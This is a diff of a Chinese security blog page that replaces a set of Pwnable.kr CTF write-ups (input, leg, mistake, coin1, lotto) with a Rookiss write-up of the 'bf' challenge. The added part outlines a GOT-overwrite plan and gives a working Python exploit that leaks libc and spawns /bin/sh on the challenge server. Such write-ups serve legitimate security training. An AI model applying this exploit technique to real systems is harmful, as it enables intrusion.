@@ -59,31 +59,52 @@
 
 
 
-<meta name="description" content="input这道题考察了很多Linux基础知识，关于命令行参数的传递，进程间通信，文件重定向，管道，socket等等
-exp如下，需要注意
+<meta name="description" content="bf
+&amp;lt;: 指针-1
+&amp;gt;: 指针+1
+.: 读取指针指向的字节
+,: 往z指针指向的字节写入一个字节
 
-因为在家目录下没有写权限，代码copy到服务器/tmp目录下，并且创建一个软链接，链接到目标flag文件，然后编译运行程序就可以了
+利用思路:
+修改putchar的got表内的地址为main首地址
+修改memset的got表内的地址为gets的地址
+修改fgets的got表内的地址为system的地址
+利用.触发
 
-#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;u">
+exp:from zio import *c_read  = COLORED(RAW, &apos;blue">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwnable.kr writeups">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/20/pwnable/index.html">
+<meta property="og:title" content="Pwnable.kr [Rookiss] writeups">
+<meta property="og:url" content="http://0byjwzsf.me/2016/07/24/pwnable-rookiss/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="input这道题考察了很多Linux基础知识，关于命令行参数的传递，进程间通信，文件重定向，管道，socket等等
-exp如下，需要注意
+<meta property="og:description" content="bf
+&amp;lt;: 指针-1
+&amp;gt;: 指针+1
+.: 读取指针指向的字节
+,: 往z指针指向的字节写入一个字节
 
-因为在家目录下没有写权限，代码copy到服务器/tmp目录下，并且创建一个软链接，链接到目标flag文件，然后编译运行程序就可以了
+利用思路:
+修改putchar的got表内的地址为main首地址
+修改memset的got表内的地址为gets的地址
+修改fgets的got表内的地址为system的地址
+利用.触发
 
-#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;u">
-<meta property="og:updated_time" content="2016-07-23T05:53:05.000Z">
+exp:from zio import *c_read  = COLORED(RAW, &apos;blue">
+<meta property="og:updated_time" content="2016-07-24T06:49:57.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Pwnable.kr writeups">
-<meta name="twitter:description" content="input这道题考察了很多Linux基础知识，关于命令行参数的传递，进程间通信，文件重定向，管道，socket等等
-exp如下，需要注意
+<meta name="twitter:title" content="Pwnable.kr [Rookiss] writeups">
+<meta name="twitter:description" content="bf
+&amp;lt;: 指针-1
+&amp;gt;: 指针+1
+.: 读取指针指向的字节
+,: 往z指针指向的字节写入一个字节
 
-因为在家目录下没有写权限，代码copy到服务器/tmp目录下，并且创建一个软链接，链接到目标flag文件，然后编译运行程序就可以了
+利用思路:
+修改putchar的got表内的地址为main首地址
+修改memset的got表内的地址为gets的地址
+修改fgets的got表内的地址为system的地址
+利用.触发
 
-#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;u">
+exp:from zio import *c_read  = COLORED(RAW, &apos;blue">
 
 
 
@@ -96,7 +117,7 @@ exp如下，需要注意
   };
 </script>
 
-  <title> Pwnable.kr writeups | Icemakr's Blog </title>
+  <title> Pwnable.kr [Rookiss] writeups | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -291,7 +312,7 @@ exp如下，需要注意
             
             
               
-                Pwnable.kr writeups
+                Pwnable.kr [Rookiss] writeups
               
             
           </h1>
@@ -300,8 +321,8 @@ exp如下，需要注意
         <div class="post-meta">
           <span class="post-time">
             发表于
-            <time itemprop="dateCreated" datetime="2016-07-20T00:00:00+08:00" content="2016-07-20">
-              2016-07-20
+            <time itemprop="dateCreated" datetime="2016-07-24T00:00:00+08:00" content="2016-07-24">
+              2016-07-24
             </time>
           </span>
 
@@ -326,8 +347,8 @@ exp如下，需要注意
             
               <span class="post-comments-count">
               &nbsp; | &nbsp;
-              <a href="/2016/07/20/pwnable/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/20/pwnable/" itemprop="commentsCount"></span>
+              <a href="/2016/07/24/pwnable-rookiss/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/24/pwnable-rookiss/" itemprop="commentsCount"></span>
               </a>
             </span>
             
@@ -346,21 +367,20 @@ exp如下，需要注意
       
 
       
-        <span itemprop="articleBody"><h2 id="input">input</h2><p>这道题考察了很多Linux基础知识，关于命令行参数的传递，进程间通信，文件重定向，管道，socket等等</p>
-<p>exp如下，需要注意</p>
-<ul>
-<li>因为在家目录下没有写权限，代码copy到服务器/tmp目录下，并且创建一个软链接，链接到目标flag文件，然后编译运行程序就可以了</li>
+        <span itemprop="articleBody"><h2 id="bf">bf</h2><ul>
+<li><code>&lt;</code>: 指针-1</li>
+<li><code>&gt;</code>: 指针+1</li>
+<li><code>.</code>: 读取指针指向的字节</li>
+<li><code>,</code>: 往z指针指向的字节写入一个字节</li>
 </ul>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> *argv[])</span></span><br><span class="line"></span>&#123;</span><br><span class="line">    <span class="comment">/* stage 1 */</span></span><br><span class="line">    <span class="keyword">int</span>     i   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>     pid = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span>    *my_argv[<span class="number">101</span>]; </span><br><span class="line">    <span class="keyword">char</span>    *my_env[<span class="number">2</span>]; </span><br><span class="line">    <span class="keyword">int</span>     pipe_fd0[<span class="number">2</span>]; </span><br><span class="line">    <span class="keyword">int</span>     pipe_fd2[<span class="number">2</span>]; </span><br><span class="line"></span><br><span class="line">    setenv(<span class="string">"PATH"</span>, <span class="string">"/home/ctf"</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">char</span> *path = (<span class="keyword">char</span> *)getenv(<span class="string">"PATH"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, path);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(pipe_fd0) &lt; <span class="number">0</span> || pipe(pipe_fd2) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"pipe0 create error\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;i &lt; <span class="number">100</span>; i++)&#123;</span><br><span class="line">        my_argv[i] = <span class="string">"AAAA"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    my_argv[<span class="string">'A'</span>] = <span class="string">"\x00"</span>; </span><br><span class="line">    my_argv[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>; </span><br><span class="line">    my_argv[<span class="string">'C'</span>] = argv[<span class="number">1</span>]; </span><br><span class="line">    my_argv[<span class="number">100</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((pid == fork()) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/* child */</span></span><br><span class="line">        close(pipe_fd0[<span class="number">1</span>]);</span><br><span class="line">        close(pipe_fd2[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        dup2(pipe_fd0[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">        dup2(pipe_fd2[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stage 3 */</span></span><br><span class="line">        my_env[<span class="number">0</span>] = <span class="string">"\xde\xad\xbe\xef=\xca\xfe\xba\xbe"</span>;</span><br><span class="line">        my_env[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line">        execve(<span class="string">"/home/ctf/pwn/input"</span>, my_argv, my_env);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="comment">/* parent */</span></span><br><span class="line">        <span class="comment">/* stage 2 */</span></span><br><span class="line">        close(pipe_fd0[<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd2[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">        write(pipe_fd0[<span class="number">1</span>], <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>);</span><br><span class="line">        write(pipe_fd2[<span class="number">1</span>], <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stage 4 */</span></span><br><span class="line">        FILE *fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"w"</span>);</span><br><span class="line">        fwrite(<span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>, <span class="number">1</span>, fp);</span><br><span class="line">        fclose(fp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* stage 5 */</span></span><br><span class="line">        <span class="keyword">struct</span> sockaddr_in  serv;</span><br><span class="line">        <span class="keyword">int</span>                 sd;</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        bzero(&amp;serv, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">        serv.sin_family         = AF_INET;</span><br><span class="line">        serv.sin_port           = htons(atoi(argv[<span class="number">1</span>]));</span><br><span class="line">        serv.sin_addr.s_addr    = inet_addr(<span class="string">"127.0.0.1"</span>);</span><br><span class="line">        sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">        connect(sd, (<span class="keyword">const</span> <span class="keyword">struct</span> sockaddr *)&amp;serv, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr));</span><br><span class="line">        send(sd, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="利用思路:">利用思路:</h3><ol>
+<li>修改<code>putchar</code>的got表内的地址为<code>main</code>首地址</li>
+<li>修改<code>memset</code>的got表内的地址为<code>gets</code>的地址</li>
+<li>修改<code>fgets</code>的got表内的地址为<code>system</code>的地址</li>
+<li>利用<code>.</code>触发</li>
+</ol>
+<h3 id="exp:">exp:</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./bf'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>,<span class="number">9001</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">100000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x8048717</span>])</span><br><span class="line"></span><br><span class="line">adr_tape    = <span class="number">0x804a0a0</span></span><br><span class="line">adr_p       = <span class="number">0x804a080</span></span><br><span class="line">got_putchar = <span class="number">0x804a030</span></span><br><span class="line">got_memset  = <span class="number">0x804a02c</span></span><br><span class="line">got_fgets   = <span class="number">0x804a010</span></span><br><span class="line">off_putchar = <span class="number">0x00677d0</span></span><br><span class="line">off_system  = <span class="number">0x003f0b0</span></span><br><span class="line">off_gets    = <span class="number">0x0065e90</span></span><br><span class="line">adr_main    = <span class="number">0x8048671</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#off_putchar = 0x0066480</span></span><br><span class="line"><span class="comment">#off_system  = 0x0040190</span></span><br><span class="line"><span class="comment">#off_fgets   = 0x0063b20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_bf</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (l32(io.read(<span class="number">4</span>)) - off_putchar)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'type some brainfuck instructions except [ ]\n'</span>)</span><br><span class="line"></span><br><span class="line">payload     =   <span class="string">'&lt;'</span> * (adr_tape - adr_p)</span><br><span class="line">payload     +=  <span class="string">','</span>             <span class="comment"># write</span></span><br><span class="line">payload     +=  <span class="string">'..&gt;.&gt;.&gt;.'</span>      <span class="comment"># read</span></span><br><span class="line">payload     +=  <span class="string">'&lt;&lt;&lt;,&gt;,&gt;,&gt;,&lt;&lt;&lt;'</span>    <span class="comment"># write</span></span><br><span class="line">payload     +=  <span class="string">'&lt;'</span> * (got_putchar - got_memset)</span><br><span class="line">payload     +=  <span class="string">',&gt;,&gt;,&gt;,&lt;&lt;&lt;'</span></span><br><span class="line">payload     +=  <span class="string">'&lt;'</span> * (got_memset - got_fgets)</span><br><span class="line">payload     +=  <span class="string">',&gt;,&gt;,&gt;,&lt;&lt;&lt;'</span></span><br><span class="line">payload     +=  <span class="string">'.'</span>             <span class="comment"># invoke</span></span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.write(<span class="string">'\x30'</span>)</span><br><span class="line">io.read(<span class="number">1</span>)</span><br><span class="line">libc_base   = read_bf()</span><br><span class="line">adr_system  = libc_base + off_system</span><br><span class="line">adr_gets    = libc_base + off_gets</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc base:       0x%x'</span> % libc_base</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system address:  0x%x'</span> % adr_system</span><br><span class="line">io.write(l32(adr_main))</span><br><span class="line">io.write(l32(adr_gets))</span><br><span class="line">io.write(l32(adr_system))</span><br><span class="line">io.writeline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 <a id="more"></a>
-<h2 id="leg">leg</h2><ul>
-<li>在执行指令I时，pc寄存器存放I+2指令的地址</li>
-<li>lr寄存器存放返回地址，即BL指令的下一条指令的地址</li>
-</ul>
-<p>key1 = 0x8ce4<br>key2 = 0x8d0c<br>key3 = 0x8d80</p>
-<h2 id="mistake">mistake</h2><p>运行程序的时候发现需要输入两次，但是代码里只用到了一处scanf<br>找了会儿后发现原因是误用mode_t参数导致open总是返回0，导致read函数总是从标准输入读取字符串到pw_buf<br>输入0123456789 1032547698<br>即可拿到flag</p>
-<h2 id="coin1">coin1</h2><p>二分解决，exp如下<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9007</span>)</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout=<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'- Ready? starting in 3 sec... -'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_title</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'N='</span>)</span><br><span class="line">    num     = int(io.read_until(<span class="string">'C='</span>)[<span class="number">0</span>:-<span class="number">3</span>])</span><br><span class="line">    chance  = int(io.read_until(<span class="string">'\n'</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> (num,chance)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(frm, to)</span>:</span></span><br><span class="line">    num = to - frm + <span class="number">1</span></span><br><span class="line">    a = (num + <span class="number">1</span>)/<span class="number">2</span></span><br><span class="line">    payload1 = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, a-<span class="number">1</span>):</span><br><span class="line">        payload1 += (str(frm + i) + <span class="string">' '</span>)</span><br><span class="line">    payload1 += str(frm + a - <span class="number">1</span>)</span><br><span class="line">    io.writeline(payload1)</span><br><span class="line">    value1 = int(io.read_line())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> value1 &lt; a * <span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span><span class="params">(title)</span>:</span></span><br><span class="line">    a = <span class="number">0</span></span><br><span class="line">    b = title[<span class="number">0</span>] - <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> a != b :</span><br><span class="line">        judge = test(a, b)</span><br><span class="line">        <span class="keyword">if</span> judge:</span><br><span class="line">            a = (b - a + <span class="number">2</span>)/<span class="number">2</span> + a</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            b = (b - a + <span class="number">2</span>)/<span class="number">2</span> + a - <span class="number">1</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'a:'</span>+str(a)+<span class="string">' b:'</span>+str(b)</span><br><span class="line">    io.writeline(str(a))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">100</span>):</span><br><span class="line">    solve(read_title())</span><br><span class="line">    io.read_until(<span class="string">'Correct!'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure></p>
-<h2 id="lotto">lotto</h2><p>程序利用<code>/dev/urandom</code>获得6字节随机字符串，然后跟自己输入的6字节字符串对比，但是下面这段循环粗心了，只要输入六个一样的字符(ascii码小于45)，猜中的概率就变成<code>1/45</code>了<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line">                        <span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">                                match++;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p>
 </span>
       
     </div>
@@ -372,16 +392,16 @@ exp如下，需要注意
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/20/protostar/" rel="next" title="Protostar writeups">
-                <i class="fa fa-chevron-left"></i> Protostar writeups
+              <a href="/2016/07/21/def-con-qual-2016-babyfirst/" rel="next" title="def-con-qual-2016-babyfirst">
+                <i class="fa fa-chevron-left"></i> def-con-qual-2016-babyfirst
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2016/07/21/def-con-qual-2016-babyfirst/" rel="prev" title="def-con-qual-2016-babyfirst">
-                def-con-qual-2016-babyfirst <i class="fa fa-chevron-right"></i>
+              <a href="/2016/07/24/qiangwang-qual-2015-shellman/" rel="prev" title="qiangwang-qual-2015-shellman">
+                qiangwang-qual-2015-shellman <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -457,7 +477,7 @@ exp如下，需要注意
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">4</span>
+              <span class="site-state-item-count">5</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -529,7 +549,7 @@ exp如下，需要注意
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#input"><span class="nav-number">1.</span> <span class="nav-text">input</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#leg"><span class="nav-number">2.</span> <span class="nav-text">leg</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#mistake"><span class="nav-number">3.</span> <span class="nav-text">mistake</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#coin1"><span class="nav-number">4.</span> <span class="nav-text">coin1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lotto"><span class="nav-number">5.</span> <span class="nav-text">lotto</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#bf"><span class="nav-number">1.</span> <span class="nav-text">bf</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路:"><span class="nav-number">1.1.</span> <span class="nav-text">利用思路:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp:"><span class="nav-number">1.2.</span> <span class="nav-text">exp:</span></a></li></ol></li></ol></div>
             
           </div>
           <div class="post-toc-indicator-bottom post-toc-indicator">
@@ -793,9 +813,9 @@ exp如下，需要注意
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/20/pwnable/';
-      var disqus_title = 'Pwnable.kr writeups';
-      var disqus_url = 'http://0byjwzsf.me/2016/07/20/pwnable/';
+      var disqus_identifier = '2016/07/24/pwnable-rookiss/';
+      var disqus_title = 'Pwnable.kr [Rookiss] writeups';
+      var disqus_url = 'http://0byjwzsf.me/2016/07/24/pwnable-rookiss/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
